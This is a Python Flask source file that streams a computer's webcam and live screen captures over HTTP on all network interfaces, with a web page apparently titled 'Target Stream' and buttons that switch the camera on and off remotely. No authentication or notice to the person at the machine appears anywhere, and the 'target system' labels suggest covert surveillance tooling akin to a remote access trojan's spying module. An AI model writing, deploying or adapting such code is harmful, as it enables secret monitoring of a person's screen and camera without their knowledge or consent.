from flask import Flask, Response, render_template_string
import cv2
import numpy as np
from PIL import ImageGrab
import threading
import time

app = Flask(__name__)

camera_handler_lock = threading.Lock()
screen_active = True
camera_active = False

class CameraHandler:
    def __init__(self):
        self.camera = None

    def start(self):
        with camera_handler_lock:
            if not self.camera:
                index = self.find_working_camera()
                if index is not None:
                    self.camera = cv2.VideoCapture(index)

    def stop(self):
        with camera_handler_lock:
            if self.camera:
                self.camera.release()
                self.camera = None

    def read_frame(self):
        with camera_handler_lock:
            if self.camera:
                ret, frame = self.camera.read()
                if ret:
                    return frame
            return None

    def is_active(self):
        with camera_handler_lock:
            return self.camera is not None

    def find_working_camera(self):
        for i in range(5):
            cap = cv2.VideoCapture(i)
            if cap.read()[0]:
                cap.release()
                return i
        return None

camera_handler = CameraHandler()

def generate_camera_frames():
    while True:
        if not camera_handler.is_active():
            time.sleep(0.1)
            continue
        frame = camera_handler.read_frame()
        if frame is not None:
            _, buffer = cv2.imencode('.jpg', frame)
            yield (b'--frame\r\nContent-Type: image/jpeg\r\n\r\n' + buffer.tobytes() + b'\r\n')
        else:
            time.sleep(0.05)

def generate_screen_frames():
    while screen_active:
        frame = np.array(ImageGrab.grab())
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        _, buffer = cv2.imencode('.jpg', frame)
        yield (b'--frame\r\nContent-Type: image/jpeg\r\n\r\n' + buffer.tobytes() + b'\r\n')

@app.route('/')
def index():
    return render_template_string('''
        <!doctype html>
        <html>
        <head>
            <title>Target Stream</title>
            <style>
                body { background: #111; color: white; font-family: Arial; text-align: center; }
                button { padding: 10px 20px; font-size: 16px; margin: 10px; cursor: pointer; }
                img { width: 90%; margin-top: 10px; border: 2px solid #444; border-radius: 8px; }
            </style>
        </head>
        <body>
            <h2>Target System Streaming</h2>
            <div>
                <button onclick="startCamera()">Start Camera</button>
                <button onclick="stopCamera()">Stop Camera</button>
            </div>
            <h3>Camera Feed</h3>
            <img id="camera" src="" />
            <h3>Screen Feed</h3>
            <img src="/screen_feed" />
            <script>
                function startCamera() {
                    fetch('/start_camera').then(() => {
                        document.getElementById('camera').src = '/video_feed';
                    });
                }
                function stopCamera() {
                    fetch('/stop_camera').then(() => {
                        document.getElementById('camera').src = '';
                    });
                }
            </script>
        </body>
        </html>
    ''')

@app.route('/video_feed')
def video_feed():
    return Response(generate_camera_frames(),
                    mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/screen_feed')
def screen_feed():
    return Response(generate_screen_frames(),
                    mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/start_camera')
def start_camera():
    global camera_active
    camera_handler.start()
    camera_active = True
    return 'Camera started'

@app.route('/stop_camera')
def stop_camera():
    global camera_active
    camera_active = False
    camera_handler.stop()
    return 'Camera stopped'

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
